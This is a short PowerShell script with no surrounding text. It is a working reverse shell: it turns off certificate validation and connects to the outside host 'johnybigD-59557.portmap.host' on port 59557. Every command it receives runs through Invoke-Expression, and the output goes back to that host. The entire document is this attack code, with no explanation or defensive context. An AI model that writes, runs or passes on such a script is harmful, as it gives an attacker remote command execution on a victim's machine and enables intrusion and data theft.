[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$c = New-Object System.Net.Sockets.TCPClient('johnybigD-59557.portmap.host', '59557');
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
$e = (iex $d 2>&1 | Out-String);
$f = [System.Text.Encoding]::ASCII.GetBytes($e);
$s.Write($f, 0, $f.Length);
$s.Flush();
}
$c.Close();
